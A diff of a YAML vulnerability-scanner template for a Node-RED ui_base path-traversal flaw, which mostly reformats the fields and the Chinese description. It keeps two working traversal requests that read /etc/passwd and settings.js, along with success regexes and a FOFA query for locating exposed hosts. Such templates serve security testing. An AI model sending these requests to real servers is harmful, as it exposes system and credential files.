@@ -1,27 +1,27 @@
+expression: r0() || r1()
 id: node-red-ui-base-anyfile-read
-
 info:
-  name: Node-RED ui_base 任意文件读取漏洞
   author: daffainfo
+  description: "Node-RED \u5728/nodes/ui_base.js\u4E2D\uFF0CURL\u4E0E'/ui_base/js/*'\u5339\
+    \u914D\uFF0C\u7136\u540E\u4F20\u9012\u7ED9path.join\uFF0C\u7F3A\u4E4F\u5BF9\u6700\
+    \u7EC8\u8DEF\u5F84\u7684\u9A8C\u8BC1\u4F1A\u5BFC\u81F4\u8DEF\u5F84\u904D\u5386\
+    \u6F0F\u6D1E\uFF0C\u53EF\u4EE5\u5229\u7528\u8FD9\u4E2A\u6F0F\u6D1E\u8BFB\u53D6\
+    \u670D\u52A1\u5668\u4E0A\u7684\u654F\u611F\u6570\u636E\uFF0C\u6BD4\u5982settings.js\n\
+    fofa-query: title=\"Node-RED\"\n"
+  name: "Node-RED ui_base \u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E"
+  reference:
+  - https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Node-RED%20ui_base%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
   severity: critical
   verified: true
-  description: |-
-    Node-RED 在/nodes/ui_base.js中，URL与'/ui_base/js/*'匹配，然后传递给path.join，缺乏对最终路径的验证会导致路径遍历漏洞，可以利用这个漏洞读取服务器上的敏感数据，比如settings.js
-    fofa: title="Node-RED"
-  reference:
-    - https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Node-RED%20ui_base%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
-  tags: node-red,fileread
-  created: 2023/09/05
-
 rules:
   r0:
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
     request:
       method: GET
       path: /ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
-    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
   r1:
+    expression: response.status == 200 && response.body.bcontains(b'username:') &&
+      response.body.bcontains(b'password:')
     request:
       method: GET
       path: /ui_base/js/..%2f..%2f..%2f..%2fsettings.js
-    expression: response.status == 200 && response.body.bcontains(b'username:') && response.body.bcontains(b'password:')
-expression: r0() || r1()
